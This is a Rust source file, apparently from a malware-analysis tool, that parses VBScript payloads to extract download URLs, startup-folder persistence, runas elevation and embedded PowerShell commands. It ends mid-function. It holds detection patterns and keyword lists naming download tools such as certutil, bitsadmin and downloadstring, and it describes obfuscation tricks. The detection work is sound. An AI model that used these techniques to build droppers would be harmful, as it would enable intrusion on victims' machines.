//! VBScript payload post-processing: extract URLs from VBS payloads.
//! Common patterns: MSXML2.XMLHTTP, WinHTTP.WinHTTPRequest, URLDownloadToFile.

use crate::env::Environment;
use crate::traits::Trait;
use crate::util::{
    find_ascii_case_insensitive_from, snippet_prefix, snippet_suffix,
    starts_with_ascii_case_insensitive,
};
use once_cell::sync::Lazy;
use regex::Regex;

const MAX_EXECUTE_COUNT: usize = 100;
const MAX_EXECUTE_EXPANSION_BYTES: usize = 1024 * 1024;

#[expect(clippy::expect_used, reason = "static regex construction")]
static XMLHTTP_OPEN_RE: Lazy<Regex> = Lazy::new(|| {
    // http.Open "GET", "url", False  /  http.Open "POST", "url", False
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*"([^"]+)""#).expect("xmlhttp")
});

#[expect(clippy::expect_used, reason = "static regex construction")]
static XMLHTTP_OPEN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\.Open\s*[("]?\s*"[A-Z]+"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\b"#)
        .expect("xmlhttp variable")
});

#[expect(clippy::expect_used, reason = "static regex construction")]
static VBS_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?im)^\s*(?:Const\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+?)\s*$"#)
        .expect("vbs string assignment")
});

#[expect(clippy::expect_used, reason = "static regex construction")]
static SAVETOFILE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.SaveToFile\s*\(?\s*"([^"]+)""#).expect("savetofile"));

#[expect(clippy::expect_used, reason = "static regex construction")]
static URLDOWN_RE: Lazy<Regex> = Lazy::new(|| {
    // URLDownloadToFile
    Regex::new(r#"(?i)URLDownloadToFile[^"]*"([^"]+)""#).expect("urldown")
});

#[expect(clippy::expect_used, reason = "static regex construction")]
static URLDOWN_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bURLDownloadToFile(?:A|W)?\b\s*\(?\s*(?:[^,\r\n]+,\s*)?([A-Za-z_][A-Za-z0-9_]*)\b"#,
    )
    .expect("urldown variable")
});

#[expect(clippy::expect_used, reason = "static regex construction")]
static RESPONSE_REDIRECT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bResponse\.Redirect\s*\(?\s*"([^"]+)""#).expect("response redirect")
});

#[expect(clippy::expect_used, reason = "static regex construction")]
static VBS_HEX_XOR_WRAPPER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\).*?\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*Crypt\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*False\s*\)"#,
    )
    .expect("vbs hex xor wrapper")
});

#[derive(Debug, Clone)]
struct VbsHexXorWrapper {
    name: String,
    key: String,
}

pub fn scan_vbs_payloads(env: &mut Environment) {
    extract_vbs_execute_inners(env);

    let payloads: Vec<Vec<u8>> = env.all_extracted_vbs.clone();
    let mut seen: std::collections::HashSet<(usize, String)> = std::collections::HashSet::new();
    let mut seen_launches: std::collections::HashSet<(usize, String)> =
        std::collections::HashSet::new();
    for (idx, payload) in payloads.iter().enumerate() {
        let raw = String::from_utf8_lossy(payload);
        let uncommented = strip_vbs_apostrophe_comments(&raw);
        let text = join_vbs_line_continuations(&uncommented);
        let bindings = collect_vbs_string_bindings(&text);
        let hex_xor_wrappers = collect_vbs_hex_xor_wrappers(&text, &bindings);
        let lossy_bindings = collect_vbs_lossy_string_bindings(&text, &bindings);
        let mut shell_bindings = lossy_bindings.clone();
        shell_bindings.extend(collect_vbs_marker_stripped_shell_bindings(
            &text,
            &lossy_bindings,
        ));
        let process_env = collect_vbs_process_env_bindings(&text, &bindings);
        let dst_hint: Option<String> = extract_savetofile_dest_exprs(&text)
            .into_iter()
            .find_map(|expr| eval_vbs_string_expr(expr, &bindings))
            .or_else(|| {
                SAVETOFILE_RE
                    .captures(&text)
                    .and_then(|c| c.get(1).map(|m| m.as_str().to_string()))
            });
        let regexes: &[&Lazy<Regex>] = &[&XMLHTTP_OPEN_RE, &URLDOWN_RE];
        for re in regexes {
            for caps in re.captures_iter(&text) {
                let Some(url_match) = caps.get(1) else {
                    continue;
                };
                let Some(url) = normalize_vbs_download_url(url_match.as_str()) else {
                    continue;
                };
                if !seen.insert((idx, url.clone())) {
                    continue;
                }
                let snippet = snippet_prefix(&text, 120);
                let dst = urldownload_dst_for_url(&text, url_match.as_str(), &url, &bindings)
                    .or_else(|| dst_hint.clone());
                env.traits.push(Trait::Download {
                    cmd: format!("(vbs #{idx}) {snippet}"),
                    src: url,
                    dst,
                });
            }
        }

        for caps in RESPONSE_REDIRECT_RE.captures_iter(&text) {
            let Some(url_match) = caps.get(1) else {
                continue;
            };
            let Some(url) = normalize_vbs_download_url(url_match.as_str()) else {
                continue;
            };
            if !seen_launches.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::UrlLaunch {
                cmd: format!("(vbs #{idx}) {snippet}"),
                url,
            });
        }

        for url in extract_shell_run_url_exprs(&text, &bindings) {
            if !seen_launches.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::UrlLaunch {
                cmd: format!("(vbs #{idx}) {snippet}"),
                url,
            });
        }

        for url in extract_shell_run_command_downloads(&text, &bindings) {
            if crate::deob_scan::is_noise_url(&url) || !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for payload in extract_shell_run_ps_scriptblocks(&text, &bindings, &process_env) {
            env.push_extracted_ps1(payload.into_bytes());
        }

        for payload in extract_shell_run_powershell_commands(&text, &shell_bindings) {
            env.push_extracted_ps1(payload.into_bytes());
        }

        for (key, value_name, command) in extract_vbs_startup_folder_persistence(&text, &bindings) {
            if env.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Persistence {
                        hive,
                        key: existing_key,
                        value_name: existing_value_name,
                        command: existing_command,
                    } if hive == "StartupFolder"
                        && existing_key.eq_ignore_ascii_case(&key)
                        && existing_value_name.eq_ignore_ascii_case(&value_name)
                        && existing_command.eq_ignore_ascii_case(&command)
                )
            }) {
                continue;
            }
            env.traits.push(Trait::Persistence {
                hive: "StartupFolder".to_string(),
                key,
                value_name,
                command,
            });
        }

        for url in extract_shell_execute_command_downloads(&text, &bindings) {
            if crate::deob_scan::is_noise_url(&url) || !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for (target, args) in extract_shell_execute_self_elevations(&text, &bindings) {
            env.traits.push(Trait::SelfElevation { target, args });
        }

        for expr in extract_xmlhttp_open_url_exprs(&text) {
            let Some(url) = eval_vbs_string_expr(expr, &bindings)
                .or_else(|| eval_vbs_hex_xor_wrapper_call(expr, &bindings, &hex_xor_wrappers))
                .and_then(|value| normalize_vbs_download_url(&value))
            else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for caps in XMLHTTP_OPEN_VAR_RE.captures_iter(&text) {
            let Some(var_match) = caps.get(1) else {
                continue;
            };
            let Some(url) = bindings.get(&var_match.as_str().to_ascii_lowercase()) else {
                continue;
            };
            let Some(url) = normalize_vbs_download_url(url) else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst_hint.clone(),
            });
        }

        for caps in URLDOWN_VAR_RE.captures_iter(&text) {
            let Some(var_match) = caps.get(1) else {
                continue;
            };
            let Some(url) = bindings.get(&var_match.as_str().to_ascii_lowercase()) else {
                continue;
            };
            let Some(url) = normalize_vbs_download_url(url) else {
                continue;
            };
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            let dst = urldownload_dst_for_url(&text, var_match.as_str(), &url, &bindings)
                .or_else(|| dst_hint.clone());
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst,
            });
        }

        for (url, dst) in extract_urldownload_expr_downloads(&text, &bindings) {
            if !seen.insert((idx, url.clone())) {
                continue;
            }
            let snippet = snippet_prefix(&text, 120);
            env.traits.push(Trait::Download {
                cmd: format!("(vbs #{idx}) {snippet}"),
                src: url,
                dst: dst.or_else(|| dst_hint.clone()),
            });
        }
    }
}

fn collect_vbs_hex_xor_wrappers(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<VbsHexXorWrapper> {
    let mut wrappers = Vec::new();
    for caps in VBS_HEX_XOR_WRAPPER_RE.captures_iter(text) {
        let Some(function_name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(function_arg) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(assign_name) = caps.get(3).map(|m| m.as_str()) else {
            continue;
        };
        let Some(crypt_arg) = caps.get(4).map(|m| m.as_str()) else {
            continue;
        };
        let Some(key_name) = caps.get(5).map(|m| m.as_str()) else {
            continue;
        };
        if !assign_name.eq_ignore_ascii_case(function_name)
            || !crypt_arg.eq_ignore_ascii_case(function_arg)
        {
            continue;
        }
        let Some(key) = bindings.get(&key_name.to_ascii_lowercase()) else {
            continue;
        };
        if key.is_empty() || key.len() > 256 {
            continue;
        }
        wrappers.push(VbsHexXorWrapper {
            name: function_name.to_ascii_lowercase(),
            key: key.clone(),
        });
    }
    wrappers
}

fn eval_vbs_hex_xor_wrapper_call(
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
    wrappers: &[VbsHexXorWrapper],
) -> Option<String> {
    let expr = expr.trim();
    let open = expr.find('(')?;
    let close = expr.rfind(')')?;
    if close <= open {
        return None;
    }
    let name = expr[..open].trim().to_ascii_lowercase();
    let wrapper = wrappers.iter().find(|wrapper| wrapper.name == name)?;
    let args = split_vbs_args(&expr[open + 1..close]);
    let arg = args.first()?.trim();
    let hex = eval_vbs_string_expr(arg, bindings)
        .or_else(|| bindings.get(&arg.to_ascii_lowercase()).cloned())?;
    decode_vbs_hex_xor(&hex, &wrapper.key)
}

fn decode_vbs_hex_xor(hex: &str, key: &str) -> Option<String> {
    let hex = hex.trim();
    if hex.is_empty()
        || hex.len() % 2 != 0
        || hex.len() > 128 * 1024
        || !hex.bytes().all(|byte| byte.is_ascii_hexdigit())
    {
        return None;
    }
    let key = key.as_bytes();
    if key.is_empty() {
        return None;
    }
    let mut out = String::with_capacity(hex.len() / 2);
    for (idx, pair) in hex.as_bytes().chunks_exact(2).enumerate() {
        let text = std::str::from_utf8(pair).ok()?;
        let byte = u8::from_str_radix(text, 16).ok()?;
        out.push((byte ^ key[idx % key.len()]) as char);
    }
    Some(out)
}

fn collect_vbs_process_env_bindings(
    text: &str,
    initial_bindings: &std::collections::HashMap<String, String>,
) -> std::collections::HashMap<String, String> {
    let mut bindings = initial_bindings.clone();
    let mut arrays: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    let mut process_env = std::collections::HashMap::new();

    for line in text.lines() {
        for statement in split_vbs_statements(line) {
            collect_vbs_array_assignment(statement, &bindings, &mut arrays);
            collect_vbs_chr_array_append(statement, &mut bindings, &arrays);
            collect_vbs_process_env_assignment(statement, &bindings, &arrays, &mut process_env);
        }
    }

    process_env
}

fn collect_vbs_array_assignment(
    statement: &str,
    bindings: &std::collections::HashMap<String, String>,
    arrays: &mut std::collections::HashMap<String, Vec<String>>,
) {
    let Some(caps) = VBS_STRING_ASSIGN_RE.captures(statement) else {
        return;
    };
    let (Some(name), Some(value)) = (caps.get(1), caps.get(2)) else {
        return;
    };
    let Some(values) = parse_vbs_array_scalar_values(value.as_str(), bindings) else {
        return;
    };
    arrays.insert(name.as_str().to_ascii_lowercase(), values);
}

fn parse_vbs_array_scalar_values(
    expr: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<Vec<String>> {
    let inner = vbs_function_args(expr, "array")?;
    let mut values = Vec::new();
    for arg in split_vbs_args(inner) {
        if let Some(value) = eval_vbs_string_expr(arg, bindings) {
            values.push(value);
        } else if let Some(value) = parse_vbs_integer(arg) {
            values.push(value.to_string());
        } else {
            return None;
        }
    }
    Some(values)
}

fn collect_vbs_chr_array_append(
    statement: &str,
    bindings: &mut std::collections::HashMap<String, String>,
    arrays: &std::collections::HashMap<String, Vec<String>>,
) {
    let Some((lhs, rhs)) = statement.split_once('=') else {
        return;
    };
    let target = lhs.trim().to_ascii_lowercase();
    if target.is_empty() {
        return;
    }
    let rhs = rhs.trim();
    let Some(rest) = rhs
        .to_ascii_lowercase()
        .strip_prefix(&(target.clone() + " & chr("))
        .map(str::to_string)
    else {
        return;
    };
    let index_expr = rest.trim().strip_suffix(')').unwrap_or(rest.trim()).trim();
    let Some((array_name, _index_var)) = index_expr.split_once('(') else {
        return;
    };
    if !index_expr.ends_with(')') {
        return;
    }
    let Some(values) = arrays.get(&array_name.to_ascii_lowercase()) else {
        return;
    };
    let mut out = bindings.remove(&target).unwrap_or_default();
    for value in values {
        let Some(codepoint) = parse_vbs_integer(value) else {
            return;
        };
        let Some(ch) = char::from_u32(codepoint) else {
            return;
        };
        out.push(ch);
    }
    bindings.insert(target, out);
}

fn collect_vbs_process_env_assignment(
    statement: &str,
    bindings: &std::collections::HashMap<String, String>,
    arrays: &std::collections::HashMap<String, Vec<String>>,
    process_env: &mut std::collections::HashMap<String, String>,
) {
    let Some((lhs, rhs)) = statement.split_once('=') else {
        return;
    };
    if !crate::util::contains_ascii_case_insensitive(lhs, "env") {
        return;
    }
    let Some(name) = vbs_env_assignment_name(lhs.trim(), bindings, arrays) else {
        return;
    };
    let Some(value) = vbs_env_assignment_value(rhs.trim(), bindings, arrays) else {
        return;
    };
    process_env.insert(name.to_ascii_uppercase(), value);
}

fn vbs_env_assignment_name(
    lhs: &str,
    bindings: &std::collections::HashMap<String, String>,
    arrays: &std::collections::HashMap<String, Vec<String>>,
) -> Option<String> {
    let open = lhs.find('(')?;
    let close = lhs.rfind(')')?;
    let expr = lhs.get(open + 1..close)?.trim();
    if let Some(value) = eval_vbs_string_expr(expr, bindings) {
        return Some(value);
    }
    let (array_name, index) = expr.split_once('(')?;
    let index = index.trim_end_matches(')');
    let index = parse_vbs_integer(index)? as usize;
    arrays
        .get(&array_name.trim().to_ascii_lowercase())?
        .get(index)
        .cloned()
}

fn vbs_env_assignment_value(
    rhs: &str,
    bindings: &std::collections::HashMap<String, String>,
    arrays: &std::collections::HashMap<String, Vec<String>>,
) -> Option<String> {
    if let Some(value) = eval_vbs_string_expr(rhs, bindings) {
        return Some(value);
    }
    let (array_name, index) = rhs.trim().split_once('(')?;
    let index = index.trim_end_matches(')');
    let index = parse_vbs_integer(index)? as usize;
    arrays
        .get(&array_name.trim().to_ascii_lowercase())?
        .get(index)
        .cloned()
}

fn extract_shell_run_ps_scriptblocks(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
    process_env: &std::collections::HashMap<String, String>,
) -> Vec<String> {
    if process_env.is_empty() || !crate::util::contains_ascii_case_insensitive(text, ".run") {
        return Vec::new();
    }

    let mut payloads = Vec::new();
    for line in text.lines() {
        let mut cursor = 0usize;
        while let Some(pos) = find_ascii_case_insensitive_from(line, ".run", cursor) {
            let mut args = line[pos + ".run".len()..].trim();
            if let Some(stripped) = args.strip_prefix('(') {
                args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
            }
            let Some(first_arg) = split_vbs_args(args).first().copied() else {
                cursor = pos + ".run".len();
                continue;
            };
            if let Some(command) = eval_vbs_string_expr(first_arg, bindings) {
                if let Some(payload) = scriptblock_env_payload(&command, process_env) {
                    payloads.push(payload);
                }
            }
            cursor = pos + ".run".len();
        }
    }
    payloads
}

fn extract_shell_run_powershell_commands(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<String> {
    if !crate::util::contains_ascii_case_insensitive(text, ".run")
        && !crate::util::contains_ascii_case_insensitive(text, ".exec")
    {
        return Vec::new();
    }

    let mut payloads = Vec::new();
    for line in text.lines() {
        for method in [".run", ".exec"] {
            let mut cursor = 0usize;
            while let Some(pos) = find_ascii_case_insensitive_from(line, method, cursor) {
                let mut args = line[pos + method.len()..].trim();
                if let Some(stripped) = args.strip_prefix('(') {
                    args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
                }
                let Some(first_arg) = split_vbs_args(args).first().copied() else {
                    cursor = pos + method.len();
                    continue;
                };
                let Some(command) = eval_vbs_string_expr_lossy(first_arg, bindings) else {
                    cursor = pos + method.len();
                    continue;
                };
                if let Some(payload) = powershell_command_payload(&command) {
                    payloads.push(payload);
                }
                cursor = pos + method.len();
            }
        }
    }
    payloads
}

fn powershell_command_payload(command: &str) -> Option<String> {
    let ps_pos = find_ascii_case_insensitive_from(command, "powershell", 0)?;
    let tail = &command[ps_pos..];
    let command_pos = find_ascii_case_insensitive_from(tail, "-command", 0)
        .or_else(|| find_ascii_case_insensitive_from(tail, "-c", 0))?;
    let flag = if tail[command_pos..]
        .get(.."-command".len())
        .is_some_and(|s| s.eq_ignore_ascii_case("-command"))
    {
        "-command"
    } else {
        "-c"
    };
    let payload = tail[command_pos + flag.len()..].trim();
    if contains_vbs_concat_residue(payload) {
        return None;
    }
    let payload = payload.trim_matches(['"', '\'']);
    if contains_vbs_concat_residue(payload) {
        return None;
    }
    (!payload.is_empty()).then(|| payload.to_string())
}

fn contains_vbs_concat_residue(payload: &str) -> bool {
    payload.starts_with('&')
        || payload.contains("\" &")
        || payload.contains("& \"")
        || payload.contains("' &")
        || payload.contains("& '")
}

fn scriptblock_env_payload(
    command: &str,
    process_env: &std::collections::HashMap<String, String>,
) -> Option<String> {
    if !crate::util::contains_ascii_case_insensitive(command, "scriptblock")
        || !crate::util::contains_ascii_case_insensitive(command, "$env:")
    {
        return None;
    }
    let env_name = first_powershell_env_ref(command)?;
    let payload = process_env.get(&env_name.to_ascii_uppercase())?;
    Some(expand_powershell_env_refs_from_vbs(payload, process_env))
}

fn first_powershell_env_ref(text: &str) -> Option<String> {
    let lower = text.to_ascii_lowercase();
    let start = lower.find("$env:")? + "$env:".len();
    let tail = &text[start..];
    let end = tail
        .char_indices()
        .find_map(|(idx, ch)| (!is_env_name_char(ch)).then_some(idx))
        .unwrap_or(tail.len());
    (end > 0).then(|| tail[..end].to_string())
}

fn expand_powershell_env_refs_from_vbs(
    payload: &str,
    process_env: &std::collections::HashMap<String, String>,
) -> String {
    let mut out = String::new();
    let mut cursor = 0usize;
    let lower = payload.to_ascii_lowercase();
    while let Some(rel) = lower[cursor..].find("$env:") {
        let start = cursor + rel;
        out.push_str(&payload[cursor..start]);
        let name_start = start + "$env:".len();
        let tail = &payload[name_start..];
        let name_len = tail
            .char_indices()
            .find_map(|(idx, ch)| (!is_env_name_char(ch)).then_some(idx))
            .unwrap_or(tail.len());
        let name = &tail[..name_len];
        if let Some(value) = process_env.get(&name.to_ascii_uppercase()) {
            out.push_str(value);
        } else {
            out.push_str(&payload[start..name_start + name_len]);
        }
        cursor = name_start + name_len;
    }
    out.push_str(&payload[cursor..]);
    out
}

fn is_env_name_char(ch: char) -> bool {
    ch.is_ascii_alphanumeric() || ch == '_'
}

fn extract_shell_run_url_exprs(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<String> {
    let mut urls = Vec::new();
    for line in text.lines() {
        let Some(run_pos) = find_ascii_case_insensitive_from(line, ".run", 0) else {
            continue;
        };
        let mut args = line[run_pos + ".run".len()..].trim();
        if let Some(stripped) = args.strip_prefix('(') {
            args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
        }
        let Some(first_arg) = split_vbs_args(args).first().copied() else {
            continue;
        };
        let Some(value) = eval_vbs_string_expr(first_arg, bindings) else {
            continue;
        };
        if let Some(url) = crate::deob_scan::normalize_liberal_url_token(&value) {
            urls.push(url);
        }
    }
    urls
}

fn extract_shell_run_command_downloads(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<String> {
    if !crate::util::contains_ascii_case_insensitive(text, ".run")
        && !crate::util::contains_ascii_case_insensitive(text, ".exec")
    {
        return Vec::new();
    }

    let mut urls = Vec::new();
    for line in text.lines() {
        for method in [".run", ".exec"] {
            let mut cursor = 0usize;
            while let Some(pos) = find_ascii_case_insensitive_from(line, method, cursor) {
                let mut args = line[pos + method.len()..].trim();
                if let Some(stripped) = args.strip_prefix('(') {
                    args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
                }
                let Some(first_arg) = split_vbs_args(args).first().copied() else {
                    cursor = pos + method.len();
                    continue;
                };
                if let Some(value) = eval_vbs_string_expr(first_arg, bindings) {
                    urls.extend(command_download_urls(&value));
                }
                cursor = pos + method.len();
            }
        }
    }
    urls
}

fn extract_vbs_startup_folder_persistence(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<(String, String, String)> {
    if !crate::util::contains_ascii_case_insensitive(text, ".SpecialFolders")
        || !crate::util::contains_ascii_case_insensitive(text, "Startup")
        || !crate::util::contains_ascii_case_insensitive(text, ".CopyFile")
    {
        return Vec::new();
    }

    let lossy_bindings = collect_vbs_lossy_string_bindings(text, bindings);
    let mut out = Vec::new();
    for line in text.lines() {
        let mut cursor = 0usize;
        while let Some(pos) = find_ascii_case_insensitive_from(line, ".CopyFile", cursor) {
            let mut args = line[pos + ".CopyFile".len()..].trim();
            if let Some(stripped) = args.strip_prefix('(') {
                args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
            }
            let parts = split_vbs_args(args);
            let Some(dst_expr) = parts.get(1).copied() else {
                cursor = pos + ".CopyFile".len();
                continue;
            };
            let Some(dst) = eval_vbs_string_expr_lossy(dst_expr, &lossy_bindings) else {
                cursor = pos + ".CopyFile".len();
                continue;
            };
            if !crate::util::contains_ascii_case_insensitive(&dst, "%Startup%")
                && !crate::util::contains_ascii_case_insensitive(&dst, "\\Startup\\")
                && !crate::util::contains_ascii_case_insensitive(&dst, "/Startup/")
            {
                cursor = pos + ".CopyFile".len();
                continue;
            }
            let Some(value_name) = vbs_windows_basename(&dst) else {
                cursor = pos + ".CopyFile".len();
                continue;
            };
            let key = dst
                .rsplit_once(['\\', '/'])
                .map(|(dir, _)| dir.to_string())
                .unwrap_or_else(|| "%Startup%".to_string());
            out.push((key, value_name.to_string(), dst));
            cursor = pos + ".CopyFile".len();
        }
    }
    out
}

fn vbs_windows_basename(path: &str) -> Option<&str> {
    let trimmed = path.trim().trim_matches(['"', '\'']);
    trimmed
        .rsplit(['\\', '/'])
        .find(|part| !part.trim().is_empty())
        .map(str::trim)
}

fn extract_shell_execute_command_downloads(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<String> {
    if !crate::util::contains_ascii_case_insensitive(text, ".shellexecute") {
        return Vec::new();
    }

    let mut urls = Vec::new();
    for line in text.lines() {
        let mut cursor = 0usize;
        while let Some(pos) = find_ascii_case_insensitive_from(line, ".shellexecute", cursor) {
            let mut args = line[pos + ".shellexecute".len()..].trim();
            if let Some(stripped) = args.strip_prefix('(') {
                args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
            }
            let parts = split_vbs_args(args);
            let Some(program_expr) = parts.first().copied() else {
                cursor = pos + ".shellexecute".len();
                continue;
            };
            let Some(mut command) = eval_vbs_string_expr(program_expr, bindings) else {
                cursor = pos + ".shellexecute".len();
                continue;
            };
            if let Some(args_expr) = parts.get(1).copied() {
                if let Some(arguments) = eval_vbs_string_expr(args_expr, bindings) {
                    if !arguments.trim().is_empty() {
                        command.push(' ');
                        command.push_str(&arguments);
                    }
                }
            }
            urls.extend(command_download_urls(&command));
            cursor = pos + ".shellexecute".len();
        }
    }
    urls
}

fn extract_shell_execute_self_elevations(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<(String, Option<String>)> {
    if !crate::util::contains_ascii_case_insensitive(text, ".shellexecute")
        || !crate::util::contains_ascii_case_insensitive(text, "runas")
    {
        return Vec::new();
    }

    let mut out = Vec::new();
    for line in text.lines() {
        let mut cursor = 0usize;
        while let Some(pos) = find_ascii_case_insensitive_from(line, ".shellexecute", cursor) {
            let mut args = line[pos + ".shellexecute".len()..].trim();
            if let Some(stripped) = args.strip_prefix('(') {
                args = stripped.trim_end().strip_suffix(')').unwrap_or(stripped);
            }
            let parts = split_vbs_args(args);
            let Some(program_expr) = parts.first().copied() else {
                cursor = pos + ".shellexecute".len();
                continue;
            };
            let Some(verb_expr) = parts.get(3).copied() else {
                cursor = pos + ".shellexecute".len();
                continue;
            };
            let Some(verb) = eval_vbs_string_expr(verb_expr, bindings) else {
                cursor = pos + ".shellexecute".len();
                continue;
            };
            if !verb.trim().eq_ignore_ascii_case("runas") {
                cursor = pos + ".shellexecute".len();
                continue;
            }
            if let Some(target) = eval_vbs_string_expr(program_expr, bindings) {
                let args = parts
                    .get(1)
                    .and_then(|expr| eval_vbs_string_expr(expr, bindings))
                    .filter(|value| !value.trim().is_empty());
                out.push((target, args));
            }
            cursor = pos + ".shellexecute".len();
        }
    }
    out
}

fn command_download_urls(command: &str) -> Vec<String> {
    let mut parts = command.split_ascii_whitespace();
    if parts.next().is_none() || parts.clone().next().is_none() {
        return Vec::new();
    }

    let download_context =
        crate::util::contains_ascii_case_insensitive(command, "invoke-webrequest")
            || crate::util::contains_ascii_case_insensitive(command, "downloadfile")
            || crate::util::contains_ascii_case_insensitive(command, "downloadstring")
            || crate::util::contains_ascii_case_insensitive(command, "bitsadmin")
            || crate::util::contains_ascii_case_insensitive(command, "certutil")
            || crate::util::contains_ascii_case_insensitive(command, "curl")
            || crate::util::contains_ascii_case_insensitive(command, "wget");
    let mut urls = Vec::new();
    for token in parts {
        let candidate = token.trim_matches(['"', '\'', '(', ')', '[', ']', '{', '}', ',', ';']);
        if let Some(url) = crate::deob_scan::normalize_liberal_url_token(candidate)
            .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(candidate))
            .or_else(|| repair_damaged_command_url(candidate, download_context))
        {
            urls.push(url);
        }
    }
    urls
}

fn repair_damaged_command_url(candidate: &str, download_context: bool) -> Option<String> {
    if !download_context {
        return None;
    }
    let repaired = if crate::util::starts_with_ascii_case_insensitive(candidate, "ttp://")
        || crate::util::starts_with_ascii_case_insensitive(candidate, "ttps://")
    {
        format!("h{candidate}")
    } else {
        return None;
    };
    let repaired = trim_glued_command_url(crate::deob_scan::trim_url_suffix(&repaired));
    crate::deob_scan::normalize_liberal_url_token(repaired)
}

fn trim_glued_command_url(url: &str) -> &str {
    const EXTENSIONS: &[&str] = &[
        ".exe", ".dll", ".ps1", ".vbs", ".js", ".jse", ".hta", ".bat", ".cmd", ".msi", ".zip",
        ".rar", ".7z", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".scr", ".bin", ".dat",
    ];
    let lower = url.to_ascii_lowercase();
    let mut best_end: Option<usize> = None;
    for ext in EXTENSIONS {
        let mut search_from = 0usize;
        while let Some(rel) = lower[search_from..].find(ext) {
            let end = search_from + rel + ext.len();
            if end == url.len()
                || url[end..]
                    .as_bytes()
                    .first()
                    .is_some_and(|b| matches!(*b, b'%' | b'!' | b'\\'))
            {
                best_end = Some(best_end.map_or(end, |best| best.min(end)));
                break;
            }
            search_from = end;
        }
    }
    best_end.map_or(url, |end| &url[..end])
}

fn extract_urldownload_expr_downloads(
    text: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Vec<(String, Option<String>)> {
    let mut out = Vec::new();
    for line in text.lines() {
        if !crate::util::contains_ascii_case_insensitive(line, "urldownloadtofile") {
            continue;
        }
        let args = urldownload_args(line);
        for idx in 0..args.len() {
            let Some(value) = eval_vbs_string_expr(args[idx].trim(), bindings) else {
                continue;
            };
            let Some(url) = normalize_vbs_download_url(&value) else {
                continue;
            };
            let dst = args
                .get(idx + 1)
                .and_then(|arg| eval_vbs_string_expr(arg.trim(), bindings))
                .filter(|candidate| normalize_vbs_download_url(candidate).is_none());
            out.push((url, dst));
        }
    }
    out
}

fn urldownload_dst_for_url(
    text: &str,
    url_arg_hint: &str,
    normalized_url: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    for line in text.lines() {
        if !crate::util::contains_ascii_case_insensitive(line, "urldownloadtofile")
            || !line.contains(url_arg_hint)
        {
            continue;
        }
        let args = urldownload_args(line);
        for idx in 0..args.len() {
            let Some(value) = eval_vbs_string_expr(args[idx].trim(), bindings) else {
                continue;
            };
            let Some(url) = normalize_vbs_download_url(&value) else {
                continue;
            };
            if url != normalized_url {
                continue;
            }
            return args
                .get(idx + 1)
                .and_then(|arg| eval_vbs_string_expr(arg.trim(), bindings))
                .filter(|dst| normalize_vbs_download_url(dst).is_none());
        }
    }
    None
}

fn normalize_vbs_download_url(value: &str) -> Option<String> {
    crate::deob_scan::normalize_liberal_url_token(value)
        .or_else(|| crate::deob_scan::normalize_schemeless_domain_path_token(value))
}

fn urldownload_args(line: &str) -> Vec<&str> {
